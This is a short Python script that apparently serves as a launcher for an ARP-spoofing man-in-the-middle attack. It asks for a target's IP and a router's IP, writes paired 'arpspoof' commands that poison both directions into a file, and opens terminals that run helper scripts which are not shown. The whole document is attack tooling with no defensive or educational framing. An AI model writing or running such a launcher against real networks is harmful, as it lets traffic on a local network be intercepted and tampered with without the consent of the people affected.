import os

Info = open('Info.txt', 'w')
Info.truncate()

Target_IP = raw_input('What is the Targets IP?\n')
Info.write('Target='+"'"+Target_IP+"'\n")

Target_Router = raw_input('What is the Routers IP?\n')
Info.write('Router='+"'"+Target_Router+"'\n")

Info.write('Right="arpspoof -i eth0 -t ' + Target_Router + ' ' + Target_IP + '"\n')
Info.write('Left="arpspoof -i eth0 -t ' + Target_IP + ' ' + Target_Router + '"\n')

os.system('gnome-terminal -e "bash IP_Check.bat"')
os.system('gnome-terminal -e "bash left.bat"')
os.system('gnome-terminal -e "bash right.bat"')
